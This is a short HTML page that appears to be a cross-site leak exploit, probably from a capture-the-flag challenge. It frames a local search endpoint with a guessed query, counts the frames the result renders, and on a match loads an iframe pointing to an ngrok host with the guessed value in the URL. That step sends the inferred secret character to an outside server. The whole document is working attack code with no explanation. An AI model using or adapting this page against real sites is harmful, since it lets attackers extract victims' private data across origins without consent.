
<html>
    <head>
        <script>
            const afterLoad = function() {
                const iframe = document.getElementById("query")
                const frames = iframe.contentWindow.frames
                if (frames.length > 1) {
                    const newIframe = document.createElement("iframe")
                    newIframe.src = "https://nonspirited-zoie-bilocular.ngrok-free.dev/" + iframe.src.split("query=")[1]
                    document.body.append(newIframe);
                }
            }
          </script>
    </head> 
      <body>
         <iframe id="query" src="http://127.0.0.1:8000/search?query=D" onload="afterLoad()"/>
      </body>
</html>
